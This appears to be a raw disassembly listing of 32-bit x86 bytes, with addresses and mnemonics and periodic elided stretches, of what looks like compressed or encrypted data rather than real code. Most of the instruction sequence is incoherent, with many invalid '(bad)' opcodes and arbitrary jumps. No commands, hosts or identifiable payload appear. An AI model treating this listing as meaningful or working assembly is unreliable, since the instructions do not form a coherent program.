  427977:	xor    al,dh
  427979:	sub    eax,0xdc40bb22
  42797e:	ss cld 
  427980:	aaa    
  427981:	mov    eax,0x725463f3
  427986:	xchg   BYTE PTR [edx-0x66],al
  427989:	in     eax,dx
  42798a:	xchg   DWORD PTR [edi+0x78],eax
  42798d:	out    0x21,eax
  42798f:	push   ss
  427990:	mov    BYTE PTR [eax],0x0
	...
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x7c5405b5]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	mov    BYTE PTR [edx+0x36],bh
  427a0f:	ja     0x4279ee
  427a11:	mov    eax,ds:0xdc2a1886
  427a16:	lea    ebx,[ecx+0x9f69c5d]
  427a1c:	and    DWORD PTR [edi+0x1e],ebp
  427a1f:	popf   
  427a20:	jae    0x4279d2
  427a22:	push   ecx
  427a23:	sbb    cl,dh
  427a25:	xor    cl,ah
  427a27:	mov    esp,0xaccee322
  427a2c:	ds push 0x2
  427a2f:	jecxz  0x4279b9
  427a31:	or     BYTE PTR [edx+0x2fa95580],cl
  427a37:	adc    eax,0xf78901a8
  427a3c:	enter  0x5451,0x4e
  427a40:	xor    DWORD PTR [eax+eiz*8-0x4e],ecx
  427a44:	sbb    eax,DWORD PTR [esi-0x3c936e46]
  427a4a:	cli    
  427a4b:	mov    ecx,0x5d614e8a
  427a50:	(bad)  
  427a51:	pop    ebp
  427a52:	pop    es
  427a53:	sbb    BYTE PTR [edx+eiz*2],dl
  427a56:	(bad)  
  427a57:	pusha  
  427a58:	xchg   eax,ebp
  427a5a:	jl     0x427a1d
  427a5c:	loopne 0x427a03
  427a5e:	mov    esp,0x5be97cae
  427a63:	mov    esp,0x13418df
  427a68:	xchg   ebx,eax
  427a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a6a:	in     al,dx
  427a6b:	xchg   edx,eax
  427a6c:	dec    ebp
  427a6d:	or     dh,BYTE PTR [ebx+eax*2+0x454767c]
  427a74:	fstp   DWORD PTR [ebx]
  427a76:	inc    edi
  427a77:	test   BYTE PTR [eax],0xfc
  427a7a:	(bad)  
  427a7b:	sahf   
  427a7c:	adc    edx,DWORD PTR [edi-0x7b899092]
  427a82:	dec    eax
  427a83:	lahf   
  427a84:	mov    cs,WORD PTR [ecx+0x52]
  427a87:	mov    edx,0x1613d94a
  427a8c:	imul   esi,DWORD PTR [esi],0xe38400e7
  427a92:	fsubr  DWORD PTR [edi+edx*8]
  427a95:	add    ebx,DWORD PTR [esi-0x56]
  427a98:	and    esi,ebp
  427a9a:	fwait
  427a9b:	inc    ebp
  427a9c:	add    al,ah
  427a9e:	pop    esi
  427a9f:	pop    es
  427aa0:	mov    edx,0x38d87cb3
  427aa5:	xchg   edi,eax
  427aa6:	pop    ebp
  427aa7:	hlt    
  427aa8:	cmc    
  427aa9:	fucomi st,st(7)
  427aab:	jnp    0x427a31
  427aad:	leave  
  427aae:	bound  edx,QWORD PTR ds:0x2512f1fd
  427ab4:	sbb    esp,DWORD PTR [edx+0x3405331b]
  427aba:	jbe    0x427b2f
  427abc:	out    dx,eax
  427abd:	jle    0x427a4b
  427abf:	fnstsw ax
  427ac1:	leave  
  427ac2:	and    eax,0x400291dc
  427ac7:	mov    edi,0x64e4a781
  427acc:	cld    
  427acd:	xchg   ebx,eax
  427ace:	pop    edx
  427acf:	(bad)
  427ad2:	in     eax,dx
  427ad3:	push   0x27
  427ad5:	jno    0x427a5b
  427ad7:	imul   eax,DWORD PTR [ebx+0x303cbf6f],0xffffffcb
  427ade:	shr    BYTE PTR [ecx-0x75d544ea],0xb7
  427ae5:	mov    dh,0x97
  427ae7:	jmp    0x427b24
  427ae9:	mov    ecx,0x2823893d
  427aee:	push   ds
  427aef:	mov    bh,0xd4
  427af1:	push   edi
  427af2:	sub    al,0xa0
  427af4:	and    esp,edi
  427af6:	bound  esp,QWORD PTR [edx+0x202b361d]
  427afc:	sbb    ebx,edx
  427afe:	mov    ebx,ds
  427b00:	(bad)  
  427b01:	push   es
  427b02:	stc    
  427b03:	jb     0x427b1a
  427b05:	(bad)  
  427b06:	adc    edi,DWORD PTR [esi]
  427b08:	sub    BYTE PTR [eax+0x2450fd68],dh
  427b0e:	sub    al,0x7d
  427b10:	sahf   
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    BYTE PTR [esi-0xe]
  427b82:	sbb    DWORD PTR [edx+0x1a8fb],0x5
  427b89:	add    DWORD PTR [eax],eax
  427b8b:	add    bh,dh
  427b8d:	and    DWORD PTR [ecx+eax*4],ebp
  427b90:	dec    bx
  427b92:	fcom   QWORD PTR [ebp-0x65]
  427b95:	jo     0x427ba1
  427b97:	push   ecx
  427b98:	and    BYTE PTR [edx+0x53953b69],0x83
  427b9f:	mov    BYTE PTR [eax],bh
  427ba1:	pop    edx
  427ba2:	adc    eax,0x78dcbfc7
  427ba7:	arpl   WORD PTR [edx],cx
  427ba9:	add    edx,DWORD PTR [edi-0x127ba990]
  427baf:	(bad)  
  427bb0:	int    0xf8
  427bb2:	mov    ch,0xe4
  427bb4:	and    DWORD PTR [esi+0x72],edi
  427bb7:	retf   0x2bd0
  427bba:	inc    ebx
  427bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bbc:	retf   0x5951
  427bbf:	aas    
  427bc0:	out    dx,al
  427bc1:	pop    ebp
  427bc2:	stos   DWORD PTR es:[edi],eax
  427bc3:	inc    edx
  427bc4:	xchg   edi,eax
  427bc5:	add    ah,BYTE PTR [edi]
  427bc7:	dec    edi
  427bc8:	je     0x427b5a
  427bca:	rol    DWORD PTR [esi],0x4e
  427bcd:	shr    DWORD PTR [edx+0x33],1
  427bd0:	jno    0x427c4f
  427bd2:	xor    dl,BYTE PTR [eax-0x73]
  427bd5:	jmp    0x427bd7
  427bd7:	mov    al,0xc6
  427bd9:	jo     0x427c41
  427bdb:	pop    ds
  427bdc:	cld    
  427bdd:	fcomp  QWORD PTR [ebx]
  427bdf:	sub    BYTE PTR [esi+eax*1],0x61
  427be3:	sar    DWORD PTR [edi+0x7397928],cl
  427be9:	in     eax,dx
  427bea:	test   eax,0xc12c90db
  427bef:	pop    sp
  427bf1:	push   ecx
  427bf2:	dec    edx
  427bf3:	mov    ds:0x56c5d81a,eax
  427bf8:	push   es
  427bf9:	in     eax,0xfa
  427bfb:	push   edx
  427bfc:	test   DWORD PTR ds:0x13d552b5,esp
  427c02:	pop    edx
  427c03:	mov    edi,0x2210dea5
  427c08:	ins    BYTE PTR es:[edi],dx
  427c09:	pop    esi
  427c0a:	adc    DWORD PTR [edi+0x76],esp
  427c0d:	js     0x427bbe
  427c0f:	nop
  427c10:	mov    eax,ds:0xcdb30d91
  427c15:	outs   dx,BYTE PTR ds:[esi]
  427c16:	in     eax,dx
  427c17:	sti    
  427c18:	scas   eax,DWORD PTR es:[edi]
  427c19:	jle    0x427be8
  427c1b:	cmp    ch,al
  427c1d:	into   
  427c1e:	(bad)  
  427c1f:	sub    eax,0xd0d708e1
  427c24:	pop    esp
  427c25:	cmc    
  427c26:	std    
  427c27:	(bad)  
  427c28:	call   0xefbf83e1
  427c2d:	jecxz  0x427bf1
  427c2f:	aam    0xa0
  427c31:	psllq  mm7,mm2
  427c34:	inc    edi
  427c35:	add    DWORD PTR [eax+0x22],0x11
  427c39:	xchg   edi,eax
  427c3a:	inc    edx
  427c3b:	mov    al,ds:0xc655d520
  427c40:	jg     0x427c19
  427c42:	mov    al,ds:0x69437508
  427c47:	xor    esp,DWORD PTR [eax-0x79]
  427c4a:	and    DWORD PTR [eax-0x1c],ebp
  427c4d:	pop    es
  427c4e:	mov    al,0x5
  427c50:	push   ebx
  427c51:	xchg   ecx,eax
  427c52:	test   edi,0xbb1fde94
  427c58:	adc    eax,0x9e0587f3
  427c5d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  427c5f:	push   cs
  427c60:	jg     0x427cb9
  427c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c63:	das    
  427c64:	daa    
  427c65:	dec    esi
  427c66:	mov    ds:0x5f6a3b75,eax
  427c6b:	dec    edi
  427c6c:	jmp    0x427bfe
  427c6e:	jns    0x427c56
  427c70:	push   0x9c58741d
  427c75:	sahf   
  427c76:	jge    0x427c00
  427c78:	adc    ah,bl
  427c7a:	cmp    esi,0x52393b7
  427c80:	or     ah,ah
  427c82:	loope  0x427ca4
  427c84:	inc    ebx
  427c85:	in     eax,dx
  427c86:	ficom  DWORD PTR [edi]
  427c88:	inc    eax
  427c89:	jo     0x427cd5
  427c8b:	hlt    
  427c8c:	stc    
  427c8d:	push   edi
  427c8e:	xchg   edi,eax
  427c8f:	or     ebp,eax
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x991c5d44,ebx
  427d02:	(bad)  
  427d03:	mov    WORD PTR [eax],es
  427d05:	stos   BYTE PTR es:[edi],al
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    eax,0xfd000001
  427d0d:	fadd   st(1),st
  427d0f:	jle    0x427d26
  427d11:	in     eax,0x5b
  427d13:	imul   eax,DWORD PTR [ecx-0x71],0xfa407e3f
  427d1a:	cdq    
  427d1b:	call   DWORD PTR [ecx+0x39b43663]
  427d21:	and    DWORD PTR [ecx+esi*8],0x14
  427d25:	jl     0x427ccd
  427d27:	push   DWORD PTR [edi+0x39]
  427d2a:	(bad)  
  427d2b:	jmp    0x427ce2
  427d2d:	or     ecx,DWORD PTR [eax]
  427d2f:	adc    eax,0xc7cd4d39
  427d34:	gs jns 0x427cd9
  427d37:	pop    ss
  427d38:	inc    cl
  427d3a:	pushf  
  427d3b:	dec    esp
  427d3c:	leave  
  427d3d:	mov    WORD PTR [edi],cs
  427d3f:	and    ch,BYTE PTR [eax]
  427d41:	lea    esp,[edx+0x5d]
  427d44:	jmp    0x427d14
  427d46:	jo     0x427d15
  427d48:	jmp    0xeed911a9
  427d4d:	sbb    dl,BYTE PTR [ebp-0x56]
  427d50:	sub    al,0x11
  427d52:	xor    DWORD PTR [edi],ebp
  427d54:	mov    ch,0x3c
  427d56:	and    BYTE PTR [esp+esi*4-0x1cef9d5b],0xb3
  427d5e:	leave  
  427d5f:	inc    edx
  427d60:	mov    al,0x19
  427d62:	daa    
  427d63:	xchg   esp,eax
  427d64:	mov    edx,0x22153b01
  427d69:	mov    ds:0xb2a823a,eax
  427d6e:	or     edi,DWORD PTR [ebp-0x2d68a143]
  427d74:	xchg   DWORD PTR [ecx],ebx
  427d76:	sub    eax,0xd85ac831
  427d7b:	addr16 and ebp,edx
  427d7e:	add    eax,0x775157c2
  427d83:	xchg   edi,eax
  427d84:	mov    eax,ds:0x2e7087c3
  427d89:	popf   
  427d8a:	(bad)  [ebx]
  427d8c:	sbb    DWORD PTR [edi+0x1bc707ae],esp
  427d92:	jge    0x427d5e
  427d94:	fdiv   st(4),st
  427d96:	arpl   WORD PTR [eax],si
  427d98:	call   0xae05acd3
  427d9d:	repz retf 0x1ffb
  427da1:	pop    ebp
  427da2:	jnp    0x427d8f
  427da4:	inc    ah
  427da6:	shr    DWORD PTR [ebp+0x370542ab],cl
  427dac:	inc    edx
  427dad:	sbb    BYTE PTR [ecx-0x31],al
  427db0:	fnstcw WORD PTR [eax+0x523b721]
  427db6:	dec    edx
  427db7:	mov    edi,0xf7f4de07
  427dbc:	pop    ebp
  427dbd:	sbb    eax,DWORD PTR [eax-0x5be54d5]
  427dc3:	rcr    al,0x33
  427dc6:	xor    BYTE PTR [edx+0x74],ah
  427dc9:	adc    cl,BYTE PTR [ebp+edi*8+0x1b6bbb81]
  427dd0:	ror    BYTE PTR [eax-0xc],0xf1
  427dd4:	push   esp
  427dd5:	cmp    DWORD PTR [ebx+ecx*1-0x62],ebx
  427dd9:	xchg   esp,eax
  427dda:	mov    esp,0x77baa04d
  427ddf:	add    ebp,DWORD PTR [eax+edi*8+0x5b7ae78c]
  427de6:	mov    ecx,0xe2afe1ee
  427deb:	or     eax,0xaf05c8f6
  427df0:	retf   
  427df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427df2:	ss cdq 
  427df4:	js     0x427d9d
  427df6:	mov    edi,0x7b0b3f29
  427dfb:	mov    eax,0x93da719a
  427e00:	inc    eax
  427e01:	xor    DWORD PTR [ecx+0x29],eax
  427e04:	xlat   BYTE PTR ds:[ebx]
  427e05:	push   esp
  427e06:	neg    ebx
  427e08:	xchg   esi,eax
  427e09:	ins    DWORD PTR es:[edi],dx
  427e0a:	inc    eax
  427e0b:	aam    0x20
  427e0d:	pop    ebp
  427e0e:	sbb    eax,0x8470
	...
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	push   0x5e92a52
  427e85:	stos   DWORD PTR es:[edi],eax
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    eax,0xb3000001
  427e8d:	adc    ebx,DWORD PTR [ebp-0xb]
  427e90:	mov    bh,0xeb
  427e92:	loop   0x427e2d
  427e94:	repz cmp DWORD PTR [edi-0x1d410ce0],edi
  427e9b:	mov    eax,ds:0x73b00dbf
  427ea0:	mov    ebx,0x77521614
  427ea5:	jnp    0x427e93
  427ea7:	es and al,0xd2
  427eaa:	mov    edx,0xb55306aa
  427eaf:	dec    esp
  427eb0:	add    eax,0x7abdc96b
  427eb5:	add    ebp,esp
  427eb7:	bswap  esi
  427eb9:	aaa    
  427eba:	pusha  
  427ebb:	xor    DWORD PTR [edi+0x77],ebp
  427ebe:	mov    ebp,0xbb1a295c
  427ec3:	mov    ah,0x6c
  427ec5:	dec    esp
  427ec6:	inc    esi
  427ec7:	or     al,BYTE PTR [edi+0x1f315b08]
  427ecd:	cmc    
  427ece:	addr16 int 0x0
  427ed1:	dec    esp
  427ed2:	jne    0x427ed9
  427ed4:	fsubr  QWORD PTR [esi]
  427ed6:	mov    bh,0x6c
  427ed8:	hlt    
  427ed9:	int    0x18
  427edb:	add    edi,edx
  427edd:	scas   al,BYTE PTR es:[edi]
  427ede:	dec    eax
  427edf:	xchg   ecx,eax
  427ee0:	mov    ds:0x758f3d1a,al
  427ee5:	(bad)
  427eea:	popa   
  427eeb:	pop    edi
  427eec:	and    BYTE PTR ds:0x3a0b09a2,0x0
  427ef3:	idiv   BYTE PTR [ebx]
  427ef5:	stos   BYTE PTR es:[edi],al
  427ef6:	test   DWORD PTR [ecx+0x22b618f4],ebp
  427efc:	(bad)  [edx+0x49]
  427eff:	leave  
  427f00:	mov    ds:0x4b546c70,al
  427f05:	and    ch,BYTE PTR [ebx+edx*2]
  427f08:	xchg   ecx,eax
  427f09:	aas    
  427f0a:	jmp    DWORD PTR [edx+eiz*4]
  427f0d:	shl    DWORD PTR [ecx+eax*8-0x43],cl
  427f11:	bound  ecx,QWORD PTR [eax+0x1da8e578]
  427f17:	shl    ebx,0xec
  427f1a:	jo     0x427ef5
  427f1c:	sbb    eax,DWORD PTR [edi-0x6e052c05]
  427f22:	mov    dh,BYTE PTR [edx-0x3ebe38d5]
  427f28:	loop   0x427ef2
  427f2a:	xchg   DWORD PTR [ebp+0x5e],edx
  427f2d:	pop    ds
  427f2e:	pop    ebx
  427f2f:	dec    ebp
  427f30:	test   DWORD PTR [ebp-0x52],0x6727fba6
  427f37:	cs in  eax,dx
  427f39:	adc    ch,bl
  427f3b:	cli    
  427f3c:	or     BYTE PTR [ebp-0x66bbd33c],bl
  427f42:	dec    ecx
  427f43:	or     BYTE PTR [edi-0x14],dh
  427f46:	sbb    DWORD PTR [ebx],0x5c
  427f49:	fscale 
  427f4b:	mov    bh,0x2b
  427f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f4e:	mov    ebp,0xc8bbc97b
  427f53:	dec    edx
  427f54:	fsubp  st(1),st
  427f56:	sub    DWORD PTR [ebx+edi*2],esi
  427f59:	jle    0x427f4e
  427f5b:	dec    esp
  427f5c:	(bad)  
  427f5d:	(bad)  
  427f5e:	sub    eax,0x5c4ed144
  427f63:	xchg   esi,eax
  427f64:	jmp    0x759765cd
  427f69:	pop    eax
  427f6a:	pop    esi
  427f6b:	xor    BYTE PTR [esi-0xd],0x3e
  427f6f:	pop    ebp
  427f70:	ror    ebp,cl
  427f72:	jb     0x427f67
  427f74:	mov    al,ds:0x1a2ebf
  427f79:	les    edi,FWORD PTR [ecx]
  427f7b:	rcr    ah,cl
  427f7d:	dec    esi
  427f7e:	les    ebx,FWORD PTR [esi-0x39]
  427f81:	lds    ebp,FWORD PTR [eax-0x30]
  427f84:	fnstcw WORD PTR [edi]
  427f86:	retf   0xa8c8
  427f89:	sbb    DWORD PTR [esi+edi*4],0x92e56360
  427f90:	enter  0x0,0x0
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428001:	(bad)  
  428003:	(bad)  
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x2d000001
  42800d:	add    edi,esi
  42800f:	outs   dx,BYTE PTR ds:[esi]
  428010:	jge    0x427fca
  428012:	das    
  428013:	dec    ecx
  428014:	cdq    
  428015:	sbb    bl,BYTE PTR [ecx]
  428017:	jge    0x428035
  428019:	ja     0x428081
  42801b:	dec    ebx
  42801c:	rol    DWORD PTR [ebx+0x4e78f2f1],cl
  428022:	jl     0x42801a
  428024:	xor    DWORD PTR [ebx+0x63],0xb1ab53f3
  42802b:	scas   al,BYTE PTR es:[edi]
  42802c:	sub    DWORD PTR [ebx],ecx
  42802e:	test   BYTE PTR [ebp-0x3311cff8],ah
  428034:	fwait
  428035:	mov    eax,0xdb2dd917
  42803a:	push   0xffffff8b
  42803c:	out    0xe2,al
  42803e:	popa   
  42803f:	(bad)  
  428040:	(bad)  
  428041:	int    0x26
  428043:	mov    bl,0x83
  428045:	lods   eax,DWORD PTR ds:[esi]
  428046:	cdq    
  428047:	cmp    eax,0x87174997
  42804c:	inc    esp
  42804d:	push   es
  42804e:	loope  0x4280c1
  428050:	(bad)  
  428052:	fs push 0xffffff94
  428055:	data16 jnp 0x427ff2
  428058:	sub    BYTE PTR [edi],al
  42805a:	pop    ebx
  42805b:	cli    
  42805c:	loope  0x428041
  42805e:	xlat   BYTE PTR ds:[ebx]
  42805f:	mov    BYTE PTR [edi],bh
  428061:	xor    dl,BYTE PTR [edi]
  428063:	ja     0x428010
  428065:	push   ss
  428066:	mov    dh,0x1a
  428068:	mov    WORD PTR [esi+0x55abc077],fs
  42806e:	loope  0x42800f
  428070:	sub    eax,0xc856d743
  428075:	icebp  
  428076:	xchg   ebp,eax
  428077:	jle    0x4280e0
  428079:	push   eax
  42807a:	jmp    ecx
  42807c:	xchg   edx,eax
  42807d:	dec    DWORD PTR [ecx-0x4c]
  428080:	popa   
  428081:	sbb    BYTE PTR [ecx],0x47
  428084:	cmp    dl,0x95
  428087:	dec    DWORD PTR [ecx+edi*1]
  42808a:	fisttp QWORD PTR [eax-0x6e7760da]
  428090:	pop    esi
  428091:	add    esp,esi
  428093:	ret    0xb210
  428096:	stos   BYTE PTR es:[edi],al
  428097:	sbb    cl,bl
  428099:	test   BYTE PTR [ebx],ah
  42809b:	push   ebp
  42809c:	mov    bl,0x5f
  42809e:	les    ebx,FWORD PTR [ebx]
  4280a0:	out    0x92,eax
  4280a2:	mov    ecx,0x8d158783
  4280a7:	loop   0x428121
  4280a9:	retf   0xebdc
  4280ac:	imul   ebx,DWORD PTR [eax-0x43fb1fb4],0x9cc2dd21
  4280b6:	loop   0x42807a
  4280b8:	fwait
  4280b9:	ss nop
  4280bb:	jg     0x428122
  4280bd:	adc    cl,BYTE PTR [eax]
  4280bf:	adc    BYTE PTR [ebp+esi*4+0x37],bh
  4280c3:	(bad)  
  4280c4:	xor    eax,edx
  4280c6:	mov    ebp,0xc6d9ed75
  4280cb:	mov    ds:0x1fcefa60,al
  4280d0:	jbe    0x4280d8
  4280d2:	add    al,0xc3
  4280d4:	outs   dx,BYTE PTR ds:[esi]
  4280d5:	in     al,0xd3
  4280d7:	aad    0xd8
  4280d9:	dec    esi
  4280da:	outs   dx,DWORD PTR ds:[esi]
  4280db:	or     DWORD PTR [eax],0xffffff92
  4280de:	repz fwait
  4280e0:	call   0xb8dd:0x15c13d32
  4280e7:	mov    al,ds:0xfab9982f
  4280ec:	xchg   ebp,eax
  4280ed:	pop    esi
  4280ee:	icebp  
  4280ef:	push   ecx
  4280f0:	add    al,BYTE PTR [ebp-0x34]
  4280f3:	gs cmp al,0xd9
  4280f6:	xchg   BYTE PTR ds:0xeeaf789b,cl
  4280fc:	jmp    0x428169
  4280fe:	pop    esi
  4280ff:	popf   
  428100:	mov    esi,0x26e808ea
  428105:	xor    ebx,DWORD PTR [edi+0x4e580f61]
  42810b:	hlt    
  42810c:	push   0x5be36e7c
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	push   ecx
  428181:	pop    ebp
  428182:	mov    dh,0x6e
  428184:	shrd   DWORD PTR [ecx],eax,cl
  428187:	add    BYTE PTR ds:0x8c000001,al
  42818d:	or     DWORD PTR [esi+0x6],esi
  428190:	push   0xffffffec
  428192:	in     eax,dx
  428193:	sbb    bh,dl
  428195:	pop    ebp
  428196:	les    edx,FWORD PTR [esi]
  428198:	inc    ecx
  428199:	test   esi,ebx
  42819b:	adc    edx,esp
  42819d:	imul   ecx,eax,0xd5b70a59
  4281a3:	ret    
  4281a4:	fimul  DWORD PTR [esi-0x6c92dcc4]
  4281aa:	mov    al,ds:0xcea7d5fe
  4281af:	mov    dl,0x64
  4281b1:	xor    eax,0x9dce1c7f
  4281b6:	pop    es
  4281b7:	aad    0x41
  4281b9:	push   cs
  4281ba:	mov    esp,0xed9483d6
  4281bf:	addr16 push edx
  4281c1:	push   es
  4281c2:	jl     0x4281a2
  4281c4:	fs dec edx
  4281c6:	test   DWORD PTR [esi+0x1f],0x84a13263
  4281cd:	mov    dl,bh
  4281cf:	adc    BYTE PTR [ecx-0x5b9ba05],bh
  4281d5:	into   
  4281d6:	std    
  4281d7:	adc    eax,0x9dd75731
  4281dc:	cwde   
  4281dd:	jmp    0x8e97d7d6
  4281e2:	pop    esp
  4281e3:	dec    ecx
  4281e4:	(bad)  
  4281e5:	push   0x46
  4281e7:	sti    
  4281e8:	sar    DWORD PTR [eax+0x3d9c4090],1
  4281ee:	add    eax,0x7681a1de
  4281f3:	fucomp st(1)
  4281f5:	loop   0x4281f6
  4281f7:	inc    eax
  4281f8:	in     al,dx
  4281f9:	scas   eax,DWORD PTR es:[edi]
  4281fa:	or     eax,DWORD PTR [edx+0x341e4d40]
  428200:	xchg   ecx,eax
  428201:	jns    0x4281e9
  428203:	jmp    0x42827a
  428205:	adc    ecx,ecx
  428207:	nop
  428208:	mov    esp,0x6314e382
  42820d:	mov    bl,0x6
  42820f:	dec    edi
  428210:	into   
  428211:	xor    dh,BYTE PTR [ebx]
  428213:	cmp    al,0x47
  428215:	push   ebp
  428216:	sub    BYTE PTR [ecx+0x503e74e4],0xd2
  42821d:	xchg   esp,eax
  42821e:	icebp  
  42821f:	loop   0x42825a
  428221:	mov    dh,0x99
  428223:	pop    ds
  428224:	and    DWORD PTR [ebx+0x64],ebx
  428227:	mov    edx,0x8a7f373f
  42822c:	or     eax,0x938d1c63
  428231:	fimul  WORD PTR [ebp+edi*1+0x1e]
  428235:	ja     0x42823d
  428237:	cmp    DWORD PTR [ecx+0x41],ebp
  42823a:	fbld   TBYTE PTR [ebp+0x6231fae4]
  428240:	jp     0x4281d0
  428242:	inc    edi
  428243:	test   BYTE PTR [ebp-0x3e],ah
  428246:	cmp    eax,0x2c676680
  42824b:	mov    ds:0x53c0f498,eax
  428250:	mov    dl,0xc6
  428252:	aas    
  428253:	jns    0x428264
  428255:	pop    DWORD PTR [edx-0x3c516053]
  42825b:	(bad)  
  42825c:	lds    edx,FWORD PTR [esp+edx*4-0x4c]
  428260:	xor    BYTE PTR [ebx+eax*8+0x391ceb7f],ah
  428267:	(bad)  
  428268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428269:	int    0xcf
  42826b:	mov    esp,0x1ce1c876
  428270:	push   esi
  428271:	mov    es,WORD PTR [esi+0x13]
  428274:	inc    esp
  428275:	jb     0x4282aa
  428277:	clc    
  428278:	and    edi,DWORD PTR [edx+0x5d]
  42827b:	xor    eax,0xee5fe38c
  428280:	push   eax
  428281:	and    dl,BYTE PTR [ebx+ecx*4]
  428284:	stos   DWORD PTR es:[edi],eax
  428285:	xor    DWORD PTR [esi-0x49],edi
  428288:	or     al,0x8f
  42828a:	fcmovne st,st(7)
  42828c:	jecxz  0x4282fb
  42828e:	xchg   ecx,eax
  42828f:	hlt    
  428290:	push   edi
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	adc    DWORD PTR [ecx-0x6d],eax
  428303:	mov    edi,0x1ae14
  428308:	add    eax,0xe4000001
  42830d:	(bad)  
  42830e:	in     al,dx
  42830f:	daa    
  428310:	dec    ebx
  428311:	sub    BYTE PTR [esi],ch
  428313:	cmc    
  428314:	adc    edi,DWORD PTR [ecx+eax*8]
  428317:	call   0x99cc3c5e
  42831c:	mul    BYTE PTR [ebx]
  42831e:	ss xor al,0x26
  428321:	fnsave [ebx-0x80]
  428324:	sbb    eax,0xd1d0c2cf
  428329:	jecxz  0x428329
  42832b:	aad    0x1c
  42832d:	xor    al,0x20
  42832f:	out    0xf5,eax
  428331:	div    DWORD PTR [edx-0x42]
  428334:	bound  ecx,QWORD PTR [esi+0x6c]
  428337:	popf   
  428338:	(bad)  
  428339:	fimul  DWORD PTR [esi+edi*8-0xba43466]
  428340:	sysenter 
  428342:	cmp    DWORD PTR [edi+0x607adb42],ebp
  428348:	mov    esp,0x14131621
  42834d:	(bad)  
  42834e:	mov    ebx,0xf00e0038
  428353:	mov    ah,0x2f
  428355:	add    BYTE PTR [ecx+0x2e],ah
  428358:	cmp    bl,bl
  42835a:	sbb    al,BYTE PTR [edx]
  42835c:	addr16 push 0xdee4d545
  428362:	cmp    DWORD PTR [edx-0x61],0xe4b16d1e
  428369:	in     eax,0x3
  42836b:	inc    esi
  42836c:	in     eax,0x2d
  42836e:	push   esp
  42836f:	cwde   
  428370:	ds dec eax
  428372:	mov    ah,0x41
  428374:	into   
  428375:	and    esp,DWORD PTR [edx-0x28949d0]
  42837b:	pop    eax
  42837c:	ins    BYTE PTR es:[edi],dx
  42837d:	jmp    0x38a39a1
  428382:	add    dl,BYTE PTR [esp+ebx*2+0x4f71a80a]
  428389:	out    0x9a,eax
  42838b:	xchg   DWORD PTR [eax],ebx
  42838d:	fucom  st(5)
  42838f:	mov    ch,BYTE PTR [ebx-0x2d4f2af1]
  428395:	jp     0x428336
  428397:	ficomp DWORD PTR [edi-0x61a0d3e8]
  42839d:	mov    ebx,0x182c67c3
  4283a2:	popf   
  4283a3:	cwde   
  4283a4:	sub    eax,0xe40c93ee
  4283a9:	sbb    dl,BYTE PTR [edi-0x65ffacd7]
  4283af:	inc    esi
  4283b0:	add    BYTE PTR [ebp-0x37360fe],0x6d
  4283b7:	xor    bh,ah
  4283b9:	and    dh,BYTE PTR [ecx]
  4283bb:	clc    
  4283bc:	add    edi,DWORD PTR [edi+ebx*4-0x1]
  4283c0:	fstp   TBYTE PTR [ebx]
  4283c2:	fstp   TBYTE PTR [esp+ebp*2+0x2]
  4283c6:	jo     0x42837a
  4283c8:	in     al,dx
  4283c9:	jmp    0xcdfd:0xca4adfda
  4283d0:	sub    BYTE PTR [ebx],cl
  4283d2:	pushf  
  4283d3:	adc    al,0x36
  4283d5:	out    0x44,al
  4283d7:	xchg   ecx,eax
  4283d8:	outs   dx,BYTE PTR ds:[esi]
  4283d9:	ja     0x4283b6
  4283db:	cwde   
  4283dc:	fistp  QWORD PTR [ecx+esi*4+0x1dcf56e3]
  4283e3:	hlt    
  4283e4:	popf   
  4283e5:	scas   eax,DWORD PTR es:[edi]
  4283e6:	out    0xf6,eax
  4283e8:	mov    eax,0x46724152
  4283ed:	jno    0x4283de
  4283ef:	fild   QWORD PTR [ebx-0x28]
  4283f2:	or     bl,dh
  4283f4:	inc    ebp
  4283f5:	aas    
  4283f6:	and    BYTE PTR [ecx+ebx*4],dh
  4283f9:	ret    
  4283fa:	shr    BYTE PTR [edx-0x6b2292be],0x5e
  428401:	mov    ds,WORD PTR [ecx+0x4c]
  428404:	cmc    
  428405:	out    0x29,eax
  428407:	fstp   st(4)
  428409:	pop    esi
  42840a:	xor    BYTE PTR [ebx-0x2],0x89
  42840e:	cdq    
  42840f:	mov    ebx,0x70
	...
  428474:	push   cs
